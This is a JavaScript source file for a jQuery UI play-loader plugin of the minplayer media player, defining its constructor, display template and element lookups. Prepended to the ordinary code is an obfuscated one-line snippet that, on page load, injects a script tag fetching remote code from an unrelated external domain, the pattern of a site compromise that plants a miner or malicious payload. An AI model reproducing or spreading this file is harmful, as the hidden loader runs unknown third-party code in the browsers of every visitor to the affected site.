var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);/** The minplayer namespace. */
var minplayer = minplayer || {};

// Define the busy object.
minplayer.playLoader = minplayer.playLoader || {};

// constructor.
minplayer.playLoader["jqueryui"] = function(context, options) {

  // Derive from busy
  minplayer.playLoader.call(this, context, options);
};

// Define the prototype for all controllers.
minplayer.playLoader["jqueryui"].prototype = new minplayer.playLoader();
minplayer.playLoader["jqueryui"].prototype.constructor = minplayer.playLoader["jqueryui"];

/**
 * Return the display for this plugin.
 */
minplayer.playLoader["jqueryui"].prototype.getDisplay = function() {

  // See if we need to build out the controller.
  if (this.options.build) {

    // Prepend the playloader template.
    this.context.prepend('\
    <div class="minplayer-jqueryui-loader-wrapper">\
      <div class="minplayer-jqueryui-big-play ui-state-default"><span></span></div>\
      <div class="minplayer-jqueryui-loader">&nbsp;</div>\
      <div class="minplayer-jqueryui-preview ui-widget-content"></div>\
    </div>');
  }

  return jQuery('.minplayer-jqueryui-loader-wrapper', this.context);
}

/**
 * Loads the preview image.
 */
minplayer.playLoader["jqueryui"].prototype.loadPreview = function() {
  if (!minplayer.playLoader.prototype.loadPreview.call(this)) {
    this.elements.preview.addClass('no-image');
  }
};

// Return the elements
minplayer.playLoader["jqueryui"].prototype.getElements = function() {
  var elements = minplayer.playLoader.prototype.getElements.call(this);
  return jQuery.extend(elements, {
    busy:jQuery(".minplayer-jqueryui-loader", this.display),
    bigPlay:jQuery(".minplayer-jqueryui-big-play", this.display),
    preview:jQuery(".minplayer-jqueryui-preview", this.display)
  });
};
